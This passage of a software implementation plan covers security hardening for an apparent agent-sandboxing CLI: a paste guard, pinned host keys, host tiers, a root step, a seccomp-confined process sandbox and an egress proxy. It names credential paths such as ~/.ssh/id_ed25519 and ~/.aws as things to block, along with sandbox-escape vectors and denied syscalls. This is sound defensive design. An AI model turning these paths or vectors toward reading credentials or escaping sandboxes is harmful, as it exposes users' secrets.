- **Docs:** `docs/how-to/alerts.md`, which says never to put `DETAIL` into code.
- **CHANGELOG:** Security. "The launcher, `ls` and notices remove control and hidden characters from text that a host sends."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P0.5 A paste guard

- **Goal:** guarantee G10 of spec 3.3. A paste never uploads a laptop file whose path a session wrote to the clipboard, nor a file under a sensitive path.
- **Files:**
  - `internal/client/attach.go` (record the OSC 52 payloads that pass).
  - `internal/client/attach_paste.go` (refuse matches and sensitive paths, and show a notice for each upload).
  - New `internal/client/paste_guard.go` (the list of paths, and the memory of 16 entries).
- **Acceptance:**
  - A session writes a laptop path with OSC 52, and then the user presses Cmd+V. The client sends the text as a paste and uploads nothing.
  - A drop of `~/.ssh/id_ed25519` is refused, with a notice.
  - A drop of a PNG uploads, with a notice that names it.
- **Tests:** unit tests of the matcher. An attach test that proves the output bytes are unchanged with the guard on.
- **Docs:** `docs/how-to/image-paste.md`.
- **CHANGELOG:** Security. "A paste no longer uploads a file whose path the session itself put on your clipboard, nor files under `~/.ssh`, `~/.aws` and other private folders. A notice names each uploaded file."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P0.6 Tie setup trust to the script's content

- **Goal:** a changed setup script asks again.
- **Files:** `internal/client/trust.go` (version 2 of `setup-trust.json`: host, repository and SHA-256), `internal/host/setup.go` (the question carries the hash), `internal/api/setup.go`.
- **Acceptance:** after a commit that changes `.<name>/setup`, the next start asks. An old file reads as "asked, no hash", which asks again once.
- **Tests:** unit tests. An end-to-end test that edits the script.
- **Docs:** `docs/how-to/setup-hooks.md`.
- **CHANGELOG:** Security. "A repository's setup script runs without a question only while its content is the one you trusted."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P0.7 Safe copies and safer git on the trusted side

- **Goal:** no trusted-side copy follows a symlink out of its root. Git on the host runs with hooks and fsmonitor off.
- **Files:** `internal/host/worktree.go` (`copyWorktreeInclude` through `os.Root`, and `git()` adds `-c core.fsmonitor=false -c core.hooksPath=/dev/null`), `internal/client/pull.go` (the same flags in `SessionRepo`).
- **Acceptance:** a symlink in `.worktreeinclude` to `~/.ssh/id_ed25519` copies nothing.
- **Tests:** unit tests with symlinks.
- **Docs:** `docs/how-to/worktrees.md`.
- **CHANGELOG:** Security. "Files listed in `.worktreeinclude` are copied only from inside the repository. A symlink that points out of it is skipped."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** S.

### P0.8 Lima VMs that cannot reach the laptop's loopback

- **Goal:** `host create lima` sets `networkOpts.hostLoopback: false`. On M3 or later with macOS 15 or later, it also sets `nestedVirtualization: true`, for phase 3.
- **Files:** `internal/provider/lima/lima.go` (`CreateArgs` adds `--set` expressions, after `sysctl -n machdep.cpu.brand_string` and `sw_vers -productVersion`), `internal/host/doctor.go` (a check that warns when the guest reaches `host.lima.internal`).
- **Acceptance:** a new VM cannot connect to a test server on the Mac's loopback address. `limactl` before 2.3 is refused with a hint.
- **Tests:** unit tests of `CreateArgs` with recorded `testdata`.
- **Docs:** `docs/how-to/create-a-host.md`.
- **CHANGELOG:** Security. "`host create lima` makes VMs that cannot reach services on your Mac's loopback address."
- **Depends on:** nothing.
- **Questions:** [37](isolation-spec.md#15-open-questions).
- **Effort:** S.

### P0.9 Watch pins that no package ecosystem covers

- **Goal:** a daily workflow fails, and opens an issue, when a pin is in an advisory's range.
- **Files:** new `.github/workflows/pins-watch.yml`, new `guest/supply.lock` (empty for now: the VMM, the kernel and `runsc`), new `scripts/pins-watch.py`. The script reads `vt/build.zig.zon`, the toolchain in `go.mod` and `guest/supply.lock`, and queries GitHub repository advisories and OSV.
- **Acceptance:** with the old Ghostty pin restored on a branch, the job fails and names GHSA-w9q4-5jvv-mcv4. Actions are pinned by SHA, and zizmor passes.
- **Tests:** new `scripts/test-pins-watch.py`, with recorded answers.
- **Docs:** `docs/contributing/releasing.md`.
- **CHANGELOG:** Changed. "A daily job checks the Ghostty, Go and guest pins against GitHub and OSV advisories, and opens an issue when an advisory names one."
- **Depends on:** nothing.
- **Questions:** [42](isolation-spec.md#15-open-questions).
- **Effort:** S.

### H3 Pinned host keys and `host rekey`

- **Goal:** each SSH host has a pinned host key that the user's config cannot undo (spec 14.7.1).
- **Files:**
  - New `internal/client/pin.go` (`PinHostKey`, `Rekey`).
  - `internal/client/ssh.go` (`baseArgs`, `sshError`) and `internal/client/machine.go` (`ForgetHost`).
  - `internal/cli/host.go` (`--host-key`, and a new `hostRekeyCmd`).
  - `internal/provider/lima/lima.go` (the pin at `host create`).
  - `go.mod` (`golang.org/x/crypto`).
  - New `docs/contributing/decisions/0035-pinned-host-keys.md`, and the records index.
- **Acceptance:**
  - `host add` prints where the pin came from.
  - A changed key fails with the message of spec 14.14 and the exit code 2, even with `StrictHostKeyChecking no` in `~/.ssh/config`.
  - `host rekey` replaces the pin after the user types the host's name.
  - Lima hosts are pinned at `host create`.
  - `ForgetHost` also removes `known_hosts-<name>`.
- **Tests:** units of `PinHostKey`: known hosts files with plain, hashed and `[host]:port` entries, and with none. Units of `baseArgs`: the pin options are there when `known_hosts-<name>` exists. End-to-end test 3.
- **Docs:** `docs/how-to/add-a-host.md`, `docs/explanation/security.md`, the reference through `just docs` for `host rekey` and `--host-key`. The record 0035.
- **CHANGELOG:** Security. "Each host you add over SSH now has a pinned host key that your SSH config cannot turn off. A changed key stops the connection, and `host rekey` replaces the pin after you confirm."
- **Depends on:** H2. It adds the record 0035.
- **Questions:** none.
- **Effort:** M.

### H4 The host ID and the tiers file

- **Goal:** each host has a tier and a host ID, kept where an older client cannot drop them (spec 14.6.2, 14.7.2 and 14.8).
- **Files:**
  - New `internal/host/hostid.go` (`HostID`), `internal/host/bridge.go` (the hello) and `internal/proto/proto.go` (`Hello.HostID`).
  - New `internal/client/tier.go` (`Tier`, `Tiers`, `LoadTiers`, `SetTier`, the migration).
  - `internal/client/conn.go` (compare the ID) and `internal/client/pin.go` (`Rekey` sets the tier to `shared`).
  - `internal/cli/host.go` (`--tier`, the question, a new `hostTierCmd`, and a tier column in `hostLsCmd`).
  - `internal/cli/create.go` (the tier for each provider) and `internal/cli/guided.go` (the question in `setup`).
  - `internal/tui/hosts_view.go` (`hostDetail`), and the add-host sheet in `internal/tui/wizard.go` and `internal/tui/wizard_view.go`.
  - New `docs/contributing/decisions/0036-host-tiers-and-the-grant-gate.md`, and the records index.
- **Acceptance:**
  - The first run of the new client writes `tiers.toml`, with every host as `own`.
  - `host add` asks the question in a terminal. `--yes` without `--tier` fails with exit code 4, and names `--tier` ([question 50](isolation-spec.md#15-open-questions)).
  - `host create e2b` gives `shared`. Lima and Docker hosts get `own`.
  - A changed host ID warns, and sets the tier to `shared`.
  - `host rekey` sets the tier to `shared`.
  - `host show <name>` prints the tier, and `host set <name> tier=<tier>` changes it. Lowering works at once. Raising needs a connection that passes the pinned key, and the typed host name.
- **Tests:** units of `LoadTiers`: the migration, and a host with no entry after it. A golden screen of the tier sheet. CLI tests of the flags.
- **Docs:** new `docs/how-to/choose-a-host-tier.md` ("Choose a host's tier"). It says that a teammate's machine is a `shared` host, and gives the recipe for a key of its own for each shared host. It also advises users to set their terminal's clipboard writes to "ask" for `shared` and `throwaway` hosts. The reference through `just docs`. The record 0036.
- **CHANGELOG:** Added. "Each host has a tier: `own`, `throwaway` or `shared`. `host add` asks who else has root on the machine, and `host show` and `host set` show or change the answer. Hosts that you added before keep working as `own`."
- **Depends on:** H3. It adds the record 0036.
- **Questions:** [26](isolation-spec.md#15-open-questions), [31](isolation-spec.md#15-open-questions), [32](isolation-spec.md#15-open-questions), [33](isolation-spec.md#15-open-questions), [34](isolation-spec.md#15-open-questions), [41](isolation-spec.md#15-open-questions), [50](isolation-spec.md#15-open-questions).
- **Effort:** M.

### H5 The grant gate and the grant ledger

- **Goal:** no grant leaves the laptop for a host whose tier is too low for it (spec 14.8.2 to 14.8.6).
- **Files:**
  - `internal/client/tier.go` (`Allow`, and the table of spec 14.8.2).
  - New `internal/client/grants.go` (`RecordGrant`, the ledger).
  - `internal/client/ops.go`, `internal/client/resume.go` and `internal/client/secrets.go` (the checks of spec 14.8.5).
  - `internal/client/config.go` (`SecretTiers`, `Host.Repos`).
  - `internal/cli/session.go` (`--untrusted`, `--ssh-agent`), `internal/cli/alerts.go` and `internal/cli/forward.go`.
  - `internal/client/ssh.go` (agent forwarding for the one session that `--ssh-agent` names).
  - `internal/cli/host.go` (a new `hostGrantsCmd`, and the rotate list in `hostRmCmd`).
  - `internal/cli/create.go` (the rotate list in `host rm --destroy`).
  - `internal/tui/actions.go` and `internal/tui/backend.go`.
  - `internal/agents/agents.go` (a hint for a low-value token, for each agent).
- **Acceptance:**
  - Each row of spec 14.8.2 holds at each call site of spec 14.8.5 that exists now.
  - Later tasks add the call sites of their own features. P1.8 adds `policy allow`, and H7 the root step. H12 adds the default host, H13 the pool, and H14 silent upgrades.
  - `new --ssh-agent` forwards the SSH agent to one session at level `none` on an `own` host. The gate refuses it on other tiers, and no sandbox ever gets it.
  - The row for user templates stays in the table. No task in this plan builds user templates, so that row has no call site yet.
  - A refused secret never runs its command.
  - `host show` lists names and counts.
  - `host rm` prints the rotate list, with or without `--destroy`.
  - `new --untrusted` sets the request tier to `throwaway` or lower (spec 14.8.4).
- **Tests:** the table of `Allow`: every grant against every tier, with and without `[secret_tiers]`. The ledger test: a secret value in the environment, a session start, and then no file under the state folder holds the value. End-to-end test 4.
- **Docs:** `docs/how-to/secrets.md`, `docs/explanation/security.md`, the reference through `just docs` for `[secret_tiers]`, `repos` and the new commands.
- **CHANGELOG:** Security. "A `throwaway` or `shared` host gets a secret only when `[secret_tiers]` marks it for that tier, and never gets an alert token. `host show` lists what each host got, by name, and `host rm` lists the secrets to rotate. `new --ssh-agent` forwards your agent to one session on an `own` host."
- **Depends on:** H4, and the record 0036 that H4 adds.
- **Questions:** [33](isolation-spec.md#15-open-questions).
- **Effort:** M.

## Phase 1: a process wall you can try

At the end of phase 1, `simstim new box --wall process` runs a session in a sandbox on a Linux host with unprivileged user namespaces. Its network is closed but for its preset, its files are its own clone, its image paste works, and `pull` brings its work back. Walls stay opt-in. The owner accepts decision 0029 before P1.4 merges.

### P1.1 Wall levels, the sandbox probe and the floor

- **Goal:** the client knows what each host can run, and pins a floor (spec 5.1 and 14.3). One read-only bridge request, the sandbox probe `sandbox.probe`, runs each driver's probe and reports the host's features. H6 is part of this task.
- **Files:**
  - New `internal/wall/wall.go` (`Level`, `ParseLevel`, `Driver`, `Probe`, `Best`, `Drivers`), new `internal/wall/probe.go` and new `internal/wall/process/probe.go`.
  - New `internal/api/wall.go` (`WallProbe`, `WallInfo`) and new `internal/api/hostcap.go` (`CapProbe`, `KVM`, `LevelsFor`).
  - New `internal/host/capprobe.go`, `internal/host/capprobe_linux.go` and `internal/host/capprobe_other.go` (`CapabilityProbe`), new `internal/host/bridge_sandbox.go` (`sandbox.probe`, behind the feature `sandbox`), `internal/host/doctor.go` (`HostInfo.Walls`), `internal/paths/paths.go` (`WallProbes()`), `cmd/host/main.go` (`wall probe --json`).
  - `internal/client/ops.go` (`Conn.CapProbe`), `internal/client/config.go` (`Host.WallFloor`), `internal/cli/host.go` (new `host show` and `host set … floor=`, the floor at `host add`, and a "Sandboxes" block in `hostDoctorCmd`), `internal/cli/create.go` (the floor at `host create`).
- **Acceptance:**
  - `simstim host show box` prints each driver, OK or not, with a reason and a fix.
  - `--floor process` writes `wall_floor`. A floor above the probe's best level is refused.
  - `host add` and `host create` pin the strongest level that probes OK, unless the user names a lower level ([question 2](isolation-spec.md#15-open-questions)).
  - `host doctor` prints the "Sandboxes" block of spec 14.2.1, and its `--json` holds the whole probe as `sandbox`.
  - The probe changes no file outside `artefacts/incoming/`.
  - An older helper gives `wall_helper_old`: "too old for sandboxes".
  - The bridge op is `sandbox.probe`, behind the feature `sandbox` (spec 10.5 and 14.3).
  - `host set … floor=` refuses a floor below the weakest level that the host's tier allows (spec 14.8.2). Lowering a host's tier raises its floor to that level.
  - Each driver's probe is cached for each boot in `StateDir()/walls.json`, keyed by `BootID()`.
- **Tests:** unit tests of `ParseLevel`, `Best`, `LevelsFor` (a table of probes), and the process driver's probe with fake files. The sandbox probe's parsers, with fixture files for `cpuinfo`, `os-release`, `cgroup.controllers` and ACL xattr bytes, on any OS. A sandbox probe under `hosttest`. End to end on the test host.
- **Docs:** new `docs/how-to/sandboxes.md` (its first part), `docs/how-to/add-a-host.md` (what the "Sandboxes" block means), `docs/how-to/troubleshoot.md`, the reference through `just docs`.
- **CHANGELOG:** Added. "`host show` shows which sandbox levels a host can run, and `host set … floor=` sets the weakest level that new sessions there may get. `host doctor` shows what the host offers for sandboxes."
- **Depends on:** H5, for the weakest level that each tier allows.
- **Questions:** [2](isolation-spec.md#15-open-questions), [5](isolation-spec.md#15-open-questions).
- **Effort:** M.

### H7 The root step

- **Goal:** the user can give a host the root access that its sandboxes need, once, seeing each line, with an undo (spec 14.4). The helper never runs sudo: the client starts sudo in a terminal that the user sees. This task also builds the set-up of P3.7. `host prepare --root-step` is the one command for the root step, and no bridge op runs sudo.
- **Files:**
  - New `internal/client/rootstep.go` (`RootStepID`, `RootScript`, `BuildRootScript`, `RootStepsFor`), and `internal/client/ssh.go` (`RunRoot`).
  - `internal/cli/host.go`: a new `hostPrepareCmd` with `--root-step run|print|skip` and `--delegate-io`.
  - `internal/host/fix.go`: the manual fixes `kvm-access` and `delegate-io`, which point at `host prepare`.
  - New `internal/tui/rootstep.go` (the root step sheet, run with `tea.ExecProcess`).
  - `internal/api/hostcap.go` (`root_steps`), and `test/e2e/sandbox_hosts.py` (`E2E_ROOT`).
  - New `docs/contributing/decisions/0037-the-root-step.md`, and the records index.
- **Acceptance:**
  - The steps are those of spec 14.4.2: `kvm-acl`, `kvm-group`, `linger`, `delegate-io`, `subuid`, `io-uring-off` and `vsock-modules`. Each has its line, its reason and its undo.
  - P1.5 adds the eighth step, `userns-apparmor`, because it needs the namespace launcher.
  - The client offers a step only when the sandbox probe shows its need. The kvm steps appear only when the probe lists a microvm driver, from P3.3 on.
  - The client marks the three steps that change the machine for every user as "machine-wide" before it runs them (spec 14.4.1).
  - `--root-step print` writes `./simstim-root-<host>.sh` (0600), and prints its SHA-256 and the line to run.
  - `--root-step run` runs the script through sudo over `ssh -t`, and checks for `__ROOT_STEP_DONE__`. Then it probes again. The probe, not the exit code, says whether the step worked.
  - The default mode follows spec 14.4.4. On a `shared` host it is `print`, and `--root-step run` needs the typed host name ([question 29](isolation-spec.md#15-open-questions)).
  - With `--yes`, the mode is `print` unless `--root-step` says otherwise. `--root-step run --yes` works only with passwordless sudo.
  - The root-owned `undo.sh` undoes every step, newest first. The laptop keeps `root-steps.json`.
  - `host doctor --fix` prints the root fixes and never runs sudo.
  - `BuildRootScript` refuses a user name outside `^[a-z_][a-z0-9_-]{0,31}$`, the name `root`, a uid of 0, and any step ID that this task does not list. No script contains `$USER`.
- **Tests:** golden scripts and undo scripts for each mix of steps, in `internal/client/testdata/root/`. The quoting fuzz test of `RunRoot`. The default-mode table of `RootStepsFor`. End-to-end test 1, with `--root-step print`. On a test host whose owner set `E2E_ROOT=run`: run, then undo, and then the probe is as before.
- **Docs:** new `docs/how-to/give-a-host-the-root-step.md` ("Give a host the root step"), with each line and its undo. `docs/how-to/uninstall.md`. The reference through `just docs`. The record 0037.
- **CHANGELOG:** Added. "`host prepare --root-step` shows the one-time root step that a host needs for stronger sandboxes, line by line. It runs the step with sudo in your terminal, or prints it for the machine's owner, and leaves an undo script on the host."
- **Depends on:** P1.1, H4. It adds the record 0037.
- **Questions:** [4](isolation-spec.md#15-open-questions), [29](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.2 The link

- **Goal:** many streams over one byte stream, with flow control (spec 5.2).
- **Files:** new `internal/link/*.go`, `internal/proto/proto.go` (`TStreamOpen`, `TStreamData`, `TStreamClose`, `TStreamWindow`).
- **Acceptance:** 1,000 streams of mixed sizes complete over a socket pair. A blocked stream does not hold others back. A wrong kind or side is refused.
- **Tests:** unit tests. A fuzz test of the frame reader. The benchmark of spec 12 that passes 1 GiB through a socket pair, at 100 MiB/s or more on one core.
- **Docs:** `docs/explanation/architecture.md` (the protocol section).
- **CHANGELOG:** Added. "The protocol gains stream frames, which carry many streams over one connection between a sandbox and its host. They never travel between the client and a host, so sessions do not change."
- **Depends on:** nothing.
- **Questions:** none.
- **Effort:** M.

### P1.3 Jails

- **Goal:** `internal/jail` confines a trusted-side command, as spec 5.6 says.
- **Files:** new `internal/jail/*.go`, `go.mod` (`go-landlock`, `go-seccomp-bpf`), `NOTICE`.
- **Acceptance:** a jailed command cannot open `$HOME`, connect a TCP socket with `NetNone`, call `ptrace` on its parent, or read `/proc/<supervisor>/mem`.
- **Tests:** unit tests that run as a normal user. They skip where user namespaces are off, and say why.
- **Docs:** `docs/explanation/architecture.md` (the jail, and how it differs from a wall).
- **CHANGELOG:** Added. "The host helper can confine the programs that read untrusted input, such as a VMM or an image converter, with namespaces, Landlock and seccomp. No program uses it yet."
- **Depends on:** nothing.
- **Questions:** [28](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.4 The supervisor, the guest init and the holder's guest mode

- **Goal:** a walled session runs with the split of spec 4, on a test-only driver `plain`. That driver starts the guest init as a child with no namespaces.
- **Files:**
  - New `internal/supervisor/*.go`: run, the frames it passes, claims, the trusted manifest and `audit.go`.
  - The memory and out-of-memory facts of walled sessions move to the supervisor, from `holder_mem.go` and `holder_oom.go`.
  - New `internal/guest/*.go`: init, the `holder` streams that it carries to `/run/<name>/holder.sock`, and the hook socket.
  - `internal/host/holder.go`: `RunHolder` reads its socket paths and manifest path from the guest's environment, and skips systemd.
  - `internal/host/launch.go` (`launchSupervisor`).
  - New `internal/host/walled.go`: `New` for walled sessions, with the environment from a fixed base, never `LoginEnv`.
  - `internal/host/manifest.go` and `internal/paths/paths.go` (the fields and paths of spec 10.7).
  - `cmd/host/main.go` (`supervise`, `wall-init`).
- **Acceptance:**
  - With the `plain` driver, attach, replay, snapshot, resize, image paste, alerts, `ls`, `rename`, `rm` and resume all work.
  - The attach fixtures prove the bytes unchanged.
  - A forged `status` claim shows as claimed.
  - A frame of a type outside the allowlist closes the connection.
  - No trusted-side process listens where a guest can connect.
- **Tests:** the runtime tests in `internal/host` run against both paths. A fuzz test of the `ctl` event parser. End to end on the test host.
- **Docs:** `docs/explanation/architecture.md` (components and flows).
- **CHANGELOG:** Added. "The host helper can run a session with a supervisor outside it, which passes its frames and keeps its record. Only a test driver uses it yet, so sessions do not change."
- **Depends on:** P1.2, P0.2. The owner accepts [0029](decisions/0029-a-sandbox-per-session.md) and [0030](decisions/0030-local-sockets-do-not-listen.md) before it merges.
- **Questions:** [23](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P1.5 The process wall

- **Goal:** the `process` driver of spec 4.1 and 7.1, and the root step that it needs on Ubuntu 23.10 or later.
- **Files:**
  - New `internal/wall/process/*.go`: namespaces, the mount layout, Landlock and the seccomp profile.
  - New `internal/guest/mounts_linux.go` and `internal/guest/seccomp.go`.
  - `internal/cli/session.go` (`new --wall`, passed on as `NewArgs.Wall`).
  - New `cmd/userns/`, the namespace launcher of question 4. It makes the user namespace and starts the guest init, and nothing else.
  - `internal/brand/brand.go` (the launcher's name) and `.goreleaser.yaml`.
  - `internal/client/rootstep.go` (the `userns-apparmor` step).
  - New `test/e2e/escape.py`.
- **The seccomp profile** refuses `unshare`, `setns` and `clone` with namespace flags. It refuses the mount family (`mount`, `umount2`, `pivot_root`, `move_mount`, `open_tree`, `fsopen`, `fsmount`, `fsconfig`, `fspick`). It refuses `keyctl`, `add_key`, `request_key`, `bpf`, `perf_event_open`, `userfaultfd`, `io_uring_setup`, `io_uring_enter`, `io_uring_register`, `kexec_load` and module loading. It refuses `socket` with any family but `AF_UNIX`, `AF_INET` and `AF_INET6`, so `AF_VSOCK` and `AF_NETLINK` fail.
- **Users:** as bubblewrap does, the guest init maps the host user to uid 0 for its set-up. Then it starts the holder in a child user namespace that maps it to uid 1000, `agent`, with no capabilities.
- **Acceptance:**
  - The escape suite passes. The sandbox cannot read the host's home, and sends no TCP or UDP out.
  - It cannot connect to `$XDG_RUNTIME_DIR/bus` or to another session's socket.
  - It gets no `/dev/kvm`, no `AF_VSOCK`, no `io_uring` and no nested user namespace.
  - The fidelity fixtures pass.
  - The `userns-apparmor` step installs a root-owned copy of the namespace launcher in `/usr/local/libexec/simstim/`. It also loads an `AppArmor` profile that lets only that path make user namespaces. Its line says "machine-wide".
  - On Ubuntu 23.10 or later without the step, `new --wall process` fails with `wall_setup` and the hint `simstim host prepare <host>`.
- **Tests:** unit tests of the mount plan. The escape suite in `test/e2e/escape.py` runs a script inside the sandbox. A golden script of the `userns-apparmor` step. On a test host, the step runs only when its owner set `E2E_ROOT=run`.
- **Docs:** `docs/how-to/sandboxes.md`, `docs/explanation/security.md` (what the profile allows), `docs/how-to/give-a-host-the-root-step.md` (the new step).
- **CHANGELOG:** Added. "`new --wall process` runs a session in a sandbox on the host, with a fresh home and no access to your files, your network or other sessions."
- **Depends on:** P1.3, P1.4, H7.
- **Questions:** [4](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P1.6 The files door

- **Goal:** the seed bundle, the clone, `StateDirs`, read-only `--mount` and `--include` (spec 7.1).
- **Files:** new `internal/host/seed.go`, new `internal/guest/seed.go`, `internal/agents/agents.go` (new fields `StateDirs`, `InstallDirs` and `ProjectFiles`), `internal/cli/session.go` (`--mount`, `--include`), `internal/client/config.go` (`[repos]`).
- **Acceptance:**
  - The clone holds the branch and its history, and no untracked file.
  - A file listed in `.worktreeinclude` is not copied without `--include`.
  - `StateDirs` survive a stop, and the rest of the home does not ([question 8](isolation-spec.md#15-open-questions)).
  - The host's agents enter read-only, from their `InstallDirs` ([question 21](isolation-spec.md#15-open-questions)).
  - A folder outside git gives an empty `/work/scratch`, and the row says "scratch" ([question 51](isolation-spec.md#15-open-questions)).
- **Tests:** unit tests of the seed and the mount parser. End to end.
- **Docs:** `docs/how-to/sandboxes.md` (files), `docs/how-to/worktrees.md`.
- **CHANGELOG:** Added. "A sandbox works on its own clone of the repository. `--mount` gives it a folder of the host, read-only unless you add `:rw`."
- **Depends on:** P1.5.
- **Questions:** [8](isolation-spec.md#15-open-questions), [21](isolation-spec.md#15-open-questions), [51](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.7 The egress process, first version

- **Goal:** the network door of spec 7.2, without DNS, interception or holds. It has the explicit proxy, SNI checks and the refused ranges. It also has presets, `--allow`, `--deny`, live grants and audit lines. The base environment sets `NODE_USE_ENV_PROXY=1`, so that Node's `fetch` uses the proxy.
- **Files:** new `internal/egress/*.go` (`policy.go`, `splice.go`, `dial.go`, `audit.go`), new `internal/egress/rules/presets.toml` and `internal/egress/rules/ranges.toml`, new `internal/guest/proxy.go`, `internal/agents/agents.go` (new fields `Egress` and `ProxyEnv`), `cmd/host/main.go` (`egress`).
- **Acceptance:**
  - In a `balanced` session, `curl https://registry.npmjs.org/` works, and `curl https://example.com/` gets a 403 with the grant command.
  - A request to the cloud metadata address, or to the host's own address, is refused. A name that resolves to either is refused too.
  - An ECH ClientHello is refused.
  - The egress process opens no TCP or UDP port. It takes flows from the supervisor over a socket pair.
- **Tests:** unit tests of `Decide` and of the address checks, IPv4 inside IPv6 too. Fuzz tests of the stream header and the SNI reader. End to end.
- **Docs:** new `docs/how-to/policy.md`.
- **CHANGELOG:** Added. "A sandbox reaches the network only through its preset, `--allow` and `--deny`. The host writes an audit line for each connection."
- **Depends on:** P1.4, [0030](decisions/0030-local-sockets-do-not-listen.md), [0031](decisions/0031-the-egress-process-is-not-a-relay.md).
- **Questions:** [23](isolation-spec.md#15-open-questions), [24](isolation-spec.md#15-open-questions).
- **Effort:** L.

### P1.8 The client and the launcher

- **Goal:** spec 9 for phase 1.
  - On `new`: `--wall auto`, the floor check, `--downgrade` and the downgrade sheet.
  - The commands `policy allow`, `policy rm`, `policy ls` and `policy log` for the session layer, `stop` and `show`, and the policy sheet without holds. P1.12 adds the other layers.
  - Badges, the `wall_downgraded` and `secret_exposed` alerts, and "exposed: NAME" for every secret in a walled session.
  - The launcher's host rows show the floor and the level that the host gives now. This is the launcher part of H10.
- **Files:** `internal/cli/session.go`, new `internal/cli/policy.go`, `internal/cli/stop.go` and `internal/cli/show.go`, `internal/client/ops.go`, `internal/client/tier.go` (the grant gate for door grants), `internal/tui/rows.go`, `internal/tui/dialog_sheets.go`, new `internal/tui/policy.go`, `internal/tui/hosts_view.go` (`hostRow`, `hostDetail`), `internal/alerts/event.go`, `internal/host/bridge.go`.
- **Acceptance:**
  - A level below the floor is refused without `--downgrade`.
  - The `process` level runs only on `own` and `throwaway` hosts, labelled "shares your account". It gets no `own`-tier secret unless the user names it with `--expose` ([question 5](isolation-spec.md#15-open-questions)).
  - `policy allow` passes the grant gate of H5. A rule above the host's tier is refused, with a hint.
  - Every new command follows [0033](decisions/0033-one-command-grammar.md), and uses the errors, prompts and `--json` of C2 and C4 in [the CLI plan](cli-plan.md).
  - The launcher's golden tests show the marks of spec 9.4 on session rows, and the floor and the level on host rows.
  - Each secret in a walled session shows as "exposed: NAME", and raises `secret_exposed` ([question 15](isolation-spec.md#15-open-questions)).
  - `--wall` defaults to `none` until P2.10 ([question 1](isolation-spec.md#15-open-questions)).
- **Tests:** unit tests, golden tests, and an end-to-end run of each command.
- **Docs:** `docs/how-to/sandboxes.md`, `docs/how-to/policy.md`, `docs/contributing/ux-spec.md` (2.3 and 2.4), the reference through `just docs`.
- **CHANGELOG:** Added. "`stop`, `show` and `policy` work on sandboxed sessions. The launcher marks each session's wall and each host's floor, and `p` opens a session's policy."
- **Depends on:** P1.1, P1.5, P1.7, H5, 0033, and C2 and C4 of [the CLI plan](cli-plan.md).
- **Questions:** [1](isolation-spec.md#15-open-questions), [5](isolation-spec.md#15-open-questions), [15](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.12 Layers, profiles and locks

- **Goal:** spec 8.1 to 8.3 and 8.7.
  - The six layers of spec 8.2, each with the same shape, and their merge in `internal/grant`: locks first, then the narrowest layer that sets a value or has a matching rule.
  - Profiles, `--profile` and `--set`. Lists that add up, with `!` to drop an inherited item. Locks at the top level and in a host's entry.
  - `policy allow`, `deny`, `rm`, `ls` and `check` at every layer, with `--once`, `--for` and `--dry-run`. P1.8 built them for the session layer only.
  - The new shape of `config.toml` and `hosts.toml`, and `config check` for it (C9 of [the CLI plan](cli-plan.md)).
- **Files:** new `internal/grant/merge.go` and `internal/grant/decide.go`, `internal/api` (`Rule`, `Lock`, `LayerKind`, `Policy`), `internal/client/config.go` (profiles, `[lock]`, the shape of `[repos]` and of hosts), `internal/cli/policy.go`, `internal/cli/session.go` (`--profile`, `--set`, `--task`).
- **Acceptance:**
  - A table test covers each rule of spec 8.2: a session's allow over a deny for all sessions, a lock over a session's allow (refused with `policy_locked`), a profile after a repository, lists with `!`, and a repository file that only narrows.
  - `policy check` names the deciding rule and its layer in each case of that table.
  - `policy allow api.example.com --repo .` writes `network.allow` in the section of the folder's origin. With `--dry-run` it writes nothing.
  - A rule with `--once` ends after one flow, and a rule with `--for` at its time.
- **Tests:** unit and table tests, golden tests of `policy ls`, and an end-to-end run of each command.
- **Docs:** new `docs/how-to/policy.md`, `docs/reference/config.md` through `just docs`, `docs/contributing/ux-spec.md`.
- **CHANGELOG:** Added. "One config for all sessions, which a host, a repository, a profile or one session can override. `policy allow` and `policy deny` add rules at any of those places, and `policy check` says which rule decides."
- **Depends on:** P1.7, P1.8, 0033.
- **Questions:** [44](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.13 Shells and commands in a sandbox

- **Goal:** spec 6.11. `shell`, `exec` and `new --in`. The `ctl` ops `spawn` and `exec`, and the `exec` stream. `[sandbox] shell` and `keep`. The sessions of one sandbox drawn together, and `t` in the launcher. This task folds P5.3.
- **Files:** new `internal/supervisor/spawn.go`, new `internal/guest/spawn.go` and `internal/guest/exec.go`, `internal/link` (the `exec` stream), new `internal/cli/shell.go` and `internal/cli/exec.go`, `internal/host/manifest.go` (`SandboxOf`), `internal/tui/rows.go`, `internal/tui/keys.go`.
- **Acceptance:**
  - `shell` opens a prompt in `/work/<repo>` as the user `agent`. The agent's session sees the files that the shell writes.
  - A request from the shell to a host that no rule allows gets the same 403 as the agent's.
  - `exec box/s -- false` exits with 1. A command past `--timeout` is killed, and `exec` exits with 124. A stopped sandbox gives `sandbox_stopped` with its hint.
  - `stop` on a shell session stops the whole sandbox and lists its sessions. `rm` on a shell session ends only that session.
  - `keep` refuses `.bashrc` with `keep_refused`.
  - A session started with `new --in <s> --detach -- <command>` comes back with its command after a stop and a wake.
- **Tests:** unit tests, golden tests of the rows, and end-to-end runs of `shell` and `exec` on a process wall.
- **Docs:** new `docs/how-to/shells.md`, the reference through `just docs`, `docs/contributing/ux-spec.md`.
- **CHANGELOG:** Added. "`shell` opens a terminal in the same sandbox as the agent, and `exec` runs one command there."
- **Depends on:** P1.4, P1.5, P1.8.
- **Questions:** [47](isolation-spec.md#15-open-questions), [48](isolation-spec.md#15-open-questions).
- **Effort:** M.

### P1.14 Sizes, variables, files and seeds from the laptop

- **Goal:** spec 17.1 to 17.4.
  - `cpus` and `memory` in any layer, `--cpus` and `--memory`, and a new size at the next start.
  - `env`, `--env` and `--env-file`, the identity variables, and the error `env_is_secret`.
  - `copy_in` and `--copy`, through `put` streams, with the caps and the paste guard's list.
  - `--seed` and `--seed-dirty`, which bundle a laptop repository without writing a ref. `--seed` repeats, and `pull --repo` picks one repository.
  - The laptop's `user.name` and `user.email` in every clone's config.
